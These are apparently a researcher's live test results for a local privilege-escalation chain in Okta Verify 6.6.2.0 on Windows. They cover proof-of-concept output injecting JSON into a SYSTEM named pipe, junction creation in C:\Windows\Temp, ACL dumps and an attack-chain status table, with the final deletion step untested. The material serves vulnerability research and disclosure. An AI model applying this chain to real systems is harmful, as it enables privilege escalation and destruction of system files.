# Okta Verify 6.6.2.0 - Live Test Results

## Test Environment
- **OS:** Windows 11 Pro 10.0.26200
- **User:** SKINNYD\uglyt (tested both elevated and non-elevated)
- **Okta Verify Version:** 6.6.2.0 (fresh install, not enrolled)
- **Date:** 2026-03-02

---

## TEST 1: Named Pipe Access (CONFIRMED)

**Tool:** `poc/okta-coordinator-pipe-poc.cs` compiled with .NET 8 SDK

```
=== Okta Verify Named Pipe PoC ===
Running as: SKINNYD\uglyt
Elevated: True
Mode: enum

[*] Checking if Okta.Coordinator.pipe exists...
[+] CONNECTED to Okta.Coordinator.pipe!
    Pipe can read: True
    Pipe can write: True
    TransmissionMode: Byte

[!] FINDING CONFIRMED:
    Standard user successfully connected to SYSTEM pipe
    The pipe ACL grants BuiltinUsersSid FullControl
    Messages are plaintext JSON (no encryption)

[*] Sending probe message...
[+] Message sent to SYSTEM service!

[*] JSON payload sent:
{"ArtifactType":"OktaVerify","AutoUpdateUrl":"https:\/\/probe.okta.com",
 "BucketId":"0","CurrentInstalledVersion":{"_Build":0,"_Major":1,"_Minor":0,
 "_Revision":0},"EventLogName":"Okta Verify","EventSourceName":"OktaVerify",
 "PipeName":null,"ReleaseChannel":"GA","UserId":null}
```

**Result:** Successfully connected to SYSTEM pipe and injected IPCMessage JSON.
The service accepts the message, processes it, and restarts the pipe listener.

**Repeat test:** Pipe reconnects after each message (confirmed recursive Start() pattern).

---

## TEST 2: Junction Creation in C:\Windows\Temp (CONFIRMED)

```
=== Junction Creation Test ===
Junction created for C:\Windows\Temp\Okta-AutoUpdate-Test-Delete-Me <<===>> C:\Windows\Temp
[+] Successfully created junction in C:\Windows\Temp as standard user!
  Attributes: Directory, ReparsePoint
  Cleaned up test junction
```

**Result:** Standard users CAN create directory junctions in `C:\Windows\Temp`.

---

## TEST 3: Service Identity (CONFIRMED)

```
=== Okta Auto Update Service ===
Name: Okta Auto Update Service
DisplayName: Okta Auto Update Service
State: Running
StartMode: Auto
StartName (runs as): LocalSystem
PathName: "C:\Program Files\Okta\UpdateService\Okta.Coordinator.Service.exe"
ProcessId: 33160

[!] Service runs as LocalSystem (NT AUTHORITY\SYSTEM)
[!] This means CleanPreviousDownloads() deletes as SYSTEM
```

---

## TEST 4: Okta-AutoUpdate Directory State (CONFIRMED)

```
=== Does Okta-AutoUpdate exist? ===
NO - does not exist (fresh install, no update has run)
A standard user can CREATE this as a junction!
```

**Result:** On fresh install, `C:\Windows\Temp\Okta-AutoUpdate` does not exist.
A standard user can pre-create it as a junction before the SYSTEM service does.

---

## TEST 5: C:\Windows\Temp ACL (CONFIRMED)

```
CREATOR OWNER | Rights=268435456 | Type=Allow | InhFlags=ContainerInherit, ObjectInherit
NT AUTHORITY\SYSTEM | Rights=268435456 | Type=Allow | InhFlags=ContainerInherit, ObjectInherit
NT AUTHORITY\SYSTEM | Rights=FullControl | Type=Allow
BUILTIN\Administrators | Rights=268435456 | Type=Allow | InhFlags=ContainerInherit, ObjectInherit
BUILTIN\Administrators | Rights=FullControl | Type=Allow
BUILTIN\Users | Rights=CreateFiles, AppendData, ExecuteFile, Synchronize | Type=Allow | InhFlags=ContainerInherit
```

**Result:** BUILTIN\Users has CreateFiles+AppendData with ContainerInherit on C:\Windows\Temp.

---

## TEST 6: Registry ACL (CONFIRMED)

```
HKLM\SOFTWARE\Okta\Okta Verify:
  BUILTIN\Users     | Rights=ReadKey                    | Type=Allow
  BUILTIN\Administrators | Rights=FullControl           | Type=Allow
  NT AUTHORITY\SYSTEM    | Rights=FullControl           | Type=Allow
```

**Security-disabling keys NOT SET:**
- DisableSslPinning = (not set)
- DisableSandbox = (not set)
- ForceDebugger = (not set)
- CallerBinaryValidationMode = (not set)
- SandboxLocationOverride = (not set)
- AutoUpdateClientVersionOverride = (not set)

---

## Attack Chain Status

| Step | Status | Notes |
|------|--------|-------|
| Pipe connection | CONFIRMED | Any local user, bidirectional |
| Message injection | CONFIRMED | JSON parsed by SYSTEM service |
| Junction creation | CONFIRMED | Standard user in C:\Windows\Temp |
| Service as SYSTEM | CONFIRMED | LocalSystem identity |
| Okta-AutoUpdate absent | CONFIRMED | Pre-creation opportunity |
| CleanPreviousDownloads trigger | NEEDS VALID URL | Requires Okta org URL with update metadata |
| End-to-end deletion | NOT YET TESTED | Need valid Okta org for complete chain |

---

## Next Steps

1. Set up a real Okta developer org to test the complete update check flow
2. Test with a valid AutoUpdateUrl to trigger CleanPreviousDownloads
3. Test junction deletion end-to-end with a safe target directory
4. Test from a non-elevated standard user account
